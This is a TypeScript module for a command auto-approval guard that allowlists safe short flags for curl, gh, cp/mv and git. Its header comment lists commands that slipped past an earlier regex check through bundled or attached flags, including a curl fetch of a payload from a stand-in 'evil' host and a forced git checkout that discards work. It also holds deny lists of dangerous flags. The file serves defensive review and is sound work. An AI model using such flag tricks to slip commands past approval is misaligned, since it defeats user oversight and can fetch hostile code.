/**
 * Flag safety for write-side permission groups (#960 review).
 *
 * ## Why the first attempt was wrong
 *
 * #959 expressed these boundaries as regexes over the raw segment text, each
 * requiring the flag as a whitespace/`=`/end-bounded token — `/(^|\s)-X(\s|=|$)/`
 * and friends. Every one of these then reached a 0ms auto-approval:
 *
 *     curl -XPOST https://api.example.com/records     (value ATTACHED to -X)
 *     curl -sSfLo out.txt https://evil/payload        (-o BUNDLED behind -sSfL)
 *     curl -d@payload.json https://api.example.com/x
 *     cp -rf src existing.txt                          (-f bundled behind -r)
 *     git checkout -qf develop                         (discards uncommitted work)
 *
 * getopt lets short options bundle (`-abc` === `-a -b -c`) and take their
 * value with no separator (`-XPOST`), so "the flag `-X` appears as its own
 * token" is simply not how the flag is written. A regex over raw text cannot
 * express that; it has to be tokenized.
 *
 * ## The rule here: allowlist the short flags, deny everything else
 *
 * Rather than enumerate dangerous letters — an open set, where anything
 * forgotten fails OPEN — each command family declares the short flags that
 * are SAFE. Any short-option cluster containing a letter outside that set
 * vetoes the segment, whether bundled, attached, or standalone.
 *
 * The cost is false negatives: `git add -n` (dry run, harmless) is refused
 * because `n` is not on git's safe list, so it escalates instead of
 * auto-approving. That is the correct direction to be wrong in. A missed
 * escalation is a question the user answers; a missed veto is a command that
 * ran.
 *
 * Long options are handled by two-way prefix matching against a dangerous
 * list, because git accepts unambiguous abbreviations: `--forc` must be
 * caught by the `--force` entry, and `--force-with-lease` must be too.
 */

import { shellWords } from './shell-safety.ts';

/** One command family's flag policy. */
interface FlagPolicy {
  /** Matches the START of a segment, e.g. /^curl\b/. */
  readonly family: RegExp;
  /**
   * Short-option letters that are safe for this family. A cluster containing
   * anything else vetoes the segment. Deliberately an allowlist: an unknown
   * flag must fail closed.
   */
  readonly safeShortFlags: string;
  /**
   * Long options that veto, matched in BOTH prefix directions so an
   * abbreviation (`--forc`) and an extension (`--force-with-lease`) are each
   * caught by the `--force` entry. Written without the leading dashes.
   */
  readonly dangerousLongFlags: readonly string[];
}

const FLAG_POLICIES: readonly FlagPolicy[] = [
  {
    // curl: safe short flags are the ones that only affect HOW the fetch is
    // made or what is printed. Everything that writes a file (-o -O -D -c
    // --trace), uploads (-T -d -F), or changes the method (-X) is absent, as
    // is -K (reads a config file that can carry any option at all).
    family: /^curl\b/,
    safeShortFlags: 'sSLlfikvIVhmuAeGNr46#',
    dangerousLongFlags: [
      'output',
      'remote-name',
      'remote-header-name',
      'create-dirs',
      'output-dir',
      'dump-header',
      'cookie',
      'cookie-jar',
      'trace',
      'trace-ascii',
      'config',
      'request',
      'method',
      'data',
      'form',
      'upload-file',
      'upload',
      'xattr',
      'json',
      'next',
    ],
  },
  {
    // `gh api` is a GET only while it carries no method and no field flags.
    family: /^gh\s+api\b/,
    safeShortFlags: 'qhi',
    dangerousLongFlags: [
      'method',
      'field',
      'raw-field',
      'input',
      'header',
      'template',
      'jq',
      'paginate',
      'silent',
      'verbose',
    ],
  },
  {
    // cp/mv: -f forces past a permission error. NOTE the real clobber
    // mechanism is the POSIX default, not -f -- that is handled by the
    // destination guard in `sensitive-paths.ts`, not here.
    family: /^(cp|mv)\b/,
    safeShortFlags: 'rRpavni',
    dangerousLongFlags: [
      'force',
      'no-target-directory',
      'target-directory',
      'strip-trailing-slashes',
    ],
  },
  {
    // git write subcommands. The safe set is deliberately small: -a/-m for
    // commit, -b/-c for branch creation on checkout/switch, -A/-u for add,
    // plus quiet/verbose. Absent, and therefore vetoed: -f (force / discard),
    // -D (force-delete), -n (--no-verify on commit), -B (force-create).
    family: /^git\b/,
    safeShortFlags: 'amAubcqv',
    dangerousLongFlags: [
      'force',
      'no-verify',
      'discard-changes',
      'hard',
      'delete',
      'prune',
      'exec',
      'upload-pack',
      'receive-pack',
      'work-tree',
      'git-dir',
      'namespace',
      'config-env',
      'ours',
      'theirs',
    ],
  },
];

/** True if `flag` and `dangerous` are prefixes of one another (either way). */
function longFlagMatches(flag: string, dangerous: string): boolean {
  // An abbreviation must be non-trivial; a bare `--` is not a flag name.
  if (flag === '') return false;
  return dangerous.startsWith(flag) || flag.startsWith(dangerous);
}

/**
 * True if a write-side segment carries a flag its family does not permit.
 *
 * Returns false for a segment matching no known family — the caller's prefix
 * curation is what decides whether an unknown command is covered at all, and
 * every write-group prefix has a policy here.
 */
export function hasUnsafeWriteFlag(segment: string): boolean {
  const policy = FLAG_POLICIES.find((p) => p.family.test(segment));
  if (policy === undefined) return false;

  for (const token of shellWords(segment)) {
    if (!token.startsWith('-') || token === '-' || token === '--') continue;

    if (token.startsWith('--')) {
      const name = token.slice(2).split('=')[0] ?? '';
      for (const dangerous of policy.dangerousLongFlags) {
        if (longFlagMatches(name, dangerous)) return true;
      }
      continue;
    }

    // Short-option cluster. EVERY letter is checked, and non-letters are
    // SKIPPED rather than treated as the start of an attached value.
    //
    // Stopping at the first non-letter was the obvious reading -- `-XPOST` is
    // flag `X` with value `POST` -- and it was wrong. Numeric flags exist:
    // `curl -1` is TLSv1 and `-4` is IPv4, so `curl -1o out.txt` bundles a
    // digit flag ahead of `-o` and the scan quit before ever seeing the `o`.
    // Found while probing this module after it was written to fix the same
    // class of bug one level down.
    //
    // Skipping non-letters cannot under-block, and over-blocks only a safe
    // flag carrying an ALPHABETIC attached value (`curl -AMozilla` escalates;
    // `curl -A Mozilla` does not). A dangerous flag with an attached value is
    // still caught on its own letter, before its value is ever reached --
    // `-XPOST` vetoes on `X`, `-d@payload` on `d`.
    const cluster = token.slice(1);
    for (const ch of cluster) {
      if (!/[a-zA-Z]/.test(ch)) continue;
      if (!policy.safeShortFlags.includes(ch)) return true;
    }
  }
  return false;
}
